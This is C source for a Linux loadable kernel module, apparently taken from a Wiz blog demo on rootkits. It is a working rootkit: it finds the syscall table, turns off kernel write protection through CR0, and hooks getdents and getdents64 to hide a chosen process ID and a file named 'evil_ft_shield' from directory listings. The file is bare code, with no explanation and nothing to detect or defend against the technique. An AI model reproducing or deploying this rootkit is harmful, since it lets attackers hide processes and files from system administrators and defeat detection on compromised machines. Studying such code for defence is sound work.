// https://www.wiz.io/blog/linux-rootkits-explained-part-2-loadable-kernel-modules#demo-time-56
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/uaccess.h>
#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#define MODULE_NAME "lkmdemo"
#define MAGIC_PREFIX "evil_ft_shield"

static int hidden_pid = 0; // PID to hide, passed from userspace
module_param(hidden_pid, int, 0644);
MODULE_PARM_DESC(hidden_pid, "PID of the process to hide");

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

unsigned long cr0;
static unsigned long *__sys_call_table;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;
static t_syscall orig_getdents64;

unsigned long * get_syscall_table_bf(void)
{
    unsigned long *syscall_table;
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    return syscall_table;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
    int ret = orig_getdents64(pt_regs), err;
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err)
        goto out;

    while (off < ret) {
        dir = (void *)kdirent + off;
        
        // Convert file name to PID and compare
        if (hidden_pid != 0 && simple_strtoul(dir->d_name, NULL, 10) == hidden_pid) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else if (strcmp(dir->d_name, MAGIC_PREFIX) == 0) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
            prev = dir;

        off += dir->d_reclen;
    }

    err = copy_to_user(dirent, kdirent, ret);
    if (err)
        goto out;
    
out:
    kfree(kdirent);
    return ret;
}

static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
    int ret = orig_getdents(pt_regs), err;
    unsigned long off = 0;
    struct linux_dirent *dir, *kdirent, *prev = NULL;

    if (ret <= 0)
        return ret;    

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err)
        goto out;

    while (off < ret) {
        dir = (void *)kdirent + off;

        // Convert file name to PID and compare
        if (hidden_pid != 0 && simple_strtoul(dir->d_name, NULL, 10) == hidden_pid) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else {
            prev = dir;
        }

        off += dir->d_reclen;
    }

    err = copy_to_user(dirent, kdirent, ret);
    if (err)
        goto out;

out:
    kfree(kdirent);
    return ret;
}

static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    write_cr0_forced(cr0);
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(cr0 & ~0x00010000);
}

static int __init lkmdemo_init(void)
{
    __sys_call_table = get_syscall_table_bf();
    if (!__sys_call_table)
        return -1;

    cr0 = read_cr0();
    orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
    orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
    unprotect_memory();
    __sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
    protect_memory();

    printk(KERN_INFO "Module loaded: hiding PID %d\n", hidden_pid);
    return 0;
}

static void __exit lkmdemo_cleanup(void)
{
    unprotect_memory();
    __sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
    protect_memory();

    printk(KERN_INFO "Module unloaded\n");
}

module_init(lkmdemo_init);
module_exit(lkmdemo_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("demo");
MODULE_DESCRIPTION("LKM to hide a process by its PID");
